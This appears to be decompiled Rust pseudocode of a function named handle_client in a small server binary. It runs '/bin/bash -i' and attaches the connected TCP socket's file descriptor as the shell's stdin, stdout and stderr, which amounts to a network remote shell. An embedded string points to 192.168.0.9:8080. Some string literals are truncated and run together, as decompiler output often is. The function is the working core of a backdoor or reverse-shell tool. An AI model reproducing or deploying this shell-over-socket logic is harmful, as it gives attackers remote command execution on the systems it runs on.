
  fn server::handle_client::h0b21350cc7b22776(arg1: i32) -> i64

{
    let mut var_e0: ();
    std::process::Command::new::h5eb91abcf33374d6(&var_e0, "/bin/bash-isrc/main.rs192.168.0.…");
    let mut var_100: ();
    std::process::Command::spawn::h5a66dce7a1b6416a(&var_100, 
        std::process::Command::stderr::h778f9adf69fa6ef6(
            std::process::Command::stdout::h3421f856f44c7056(
                std::process::Command::stdin::he98e54bf20c0f4f0(
                    std::process::Command::arg::h92aa95d0ce24437c(&var_e0, 
                        "-isrc/main.rs192.168.0.9:8080{in…"), 
                    3, 
                    _$LT$std..sys..pal..unix..fs..File$u20$as$u20$std..os..fd..raw..FromRawFd$GT$::from_raw_fd::h40ca4af0261e0ab7(arg1)), 
                3, 
                _$LT$std..sys..pal..unix..fs..File$u20$as$u20$std..os..fd..raw..FromRawFd$GT$::from_raw_fd::h40ca4af0261e0ab7(arg1)), 
            3, 
            _$LT$std..sys..pal..unix..fs..File$u20$as$u20$std..os..fd..raw..FromRawFd$GT$::from_raw_fd::h40ca4af0261e0ab7(arg1)));
    let mut var_11c: ();
    core::result::Result$LT$T$C$E$GT$::unwrap::h3a1e058414a6c9ec(&var_11c, &var_100);
    std::process::Child::wait::h9eaa6dd104164a58(&var_100, &var_11c);
    core::result::Result$LT$T$C$E$GT$::unwrap::h355d22e1d7af9bcb(&var_100);
    core::ptr::drop_in_place$LT$std..process..Child$GT$::ha239f9afbc4a57d3(&var_11c);
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h62424edbded0113a(&var_e0);
    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::haee64bd767160edc(arg1)
}
